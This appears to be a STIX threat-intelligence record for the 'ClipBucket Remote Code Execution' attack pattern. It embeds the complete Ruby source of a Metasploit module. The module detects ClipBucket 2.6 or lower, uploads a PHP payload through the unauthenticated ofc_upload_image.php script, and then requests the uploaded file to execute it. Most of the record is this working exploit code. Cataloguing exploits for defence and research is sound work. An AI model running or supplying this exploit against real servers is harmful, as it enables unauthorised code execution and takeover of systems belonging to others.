{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--29c4bfaf-0668-4aaf-9c00-ba3de38bd86d",
    "created": "2024-08-14T17:13:16.817203Z",
    "modified": "2024-08-14T17:13:16.817208Z",
    "name": "\"ClipBucket Remote Code Execution\"",
    "description": " This module exploits a vulnerability found in ClipBucket version 2.6 and lower. The script \"/admin_area/charts/ofc-library/ofc_upload_image.php\" can be used to upload arbitrary code without any authentication. This module has been tested on version 2.6 on CentOS 5.9 32-bit.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/clipbucket_upload_exec.rb",
            "external_id": "clipbucket_upload_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"ClipBucket Remote Code Execution\",\n      'Description'    => %q{\n        This module exploits a vulnerability found in ClipBucket version 2.6 and lower.\n        The script \"/admin_area/charts/ofc-library/ofc_upload_image.php\" can be used to\n        upload arbitrary code without any authentication. This module has been tested\n        on version 2.6 on CentOS 5.9 32-bit.\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'Gabby', # Vulnerability Discovery, PoC\n          'xistence <xistence[at]0x90.nl>' # Metasploit module\n        ],\n      'References'      =>\n        [\n          [ 'PACKETSTORM', '123480' ]\n        ],\n      'Platform'        => ['php'],\n      'Arch'            => ARCH_PHP,\n      'Targets'         =>\n        [\n          ['Clipbucket 2.6', {}]\n        ],\n      'Privileged'      => false,\n      'DisclosureDate'  => '2013-10-04',\n      'DefaultTarget'   => 0))\n\n    register_options(\n      [\n       OptString.new('TARGETURI', [true, 'The base path to the ClipBucket application', '/'])\n      ])\n  end\n\n  def uri\n    return target_uri.path\n  end\n\n  def check\n    # Check version\n    peer = \"#{rhost}:#{rport}\"\n\n    vprint_status(\"Trying to detect installed version\")\n\n    res = send_request_cgi({\n     'method' => 'GET',\n     'uri'    => normalize_uri(uri, \"\")\n    })\n\n    if res and res.code == 200 and res.body =~ /ClipBucket version (\\d+\\.\\d+)/\n      version = $1\n    else\n      return Exploit::CheckCode::Unknown\n    end\n\n    vprint_status(\"Version #{version} detected\")\n\n    if version > \"2.6\"\n      return Exploit::CheckCode::Safe\n    else\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    peer = \"#{rhost}:#{rport}\"\n    payload_name = rand_text_alphanumeric(rand(10) + 5) + \".php\"\n\n    print_status(\"Uploading payload [ #{payload_name} ]\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(uri, \"admin_area\", \"charts\", \"ofc-library\", \"ofc_upload_image.php\"),\n      'headers'  => { 'Content-Type' => 'text/plain' },\n      'vars_get' => { 'name' => payload_name },\n      'data'  => payload.encoded\n    })\n\n    # If the server returns 200 we assume we uploaded the malicious\n    # file successfully\n    if not res or res.code != 200 or res.body !~ /Saving your image to: \\.\\.\\/tmp-upload-images\\/(#{payload_name})/ or res.body =~ /HTTP_RAW_POST_DATA/\n      fail_with(Failure::None, \"#{peer} - File wasn't uploaded, aborting!\")\n    end\n\n    register_files_for_cleanup(payload_name)\n\n    print_status(\"Executing Payload [ #{uri}/admin_area/charts/tmp-upload-images/#{payload_name} ]\" )\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(uri, \"admin_area\", \"charts\", \"tmp-upload-images\", payload_name)\n    })\n\n    # If we don't get a 200 when we request our malicious payload, we suspect\n    # we don't have a shell, either.\n    if res and res.code != 200\n      print_error(\"Unexpected response, probably the exploit failed\")\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-10-04",
    "x_mitre_platforms": [
        "['php']"
    ]
}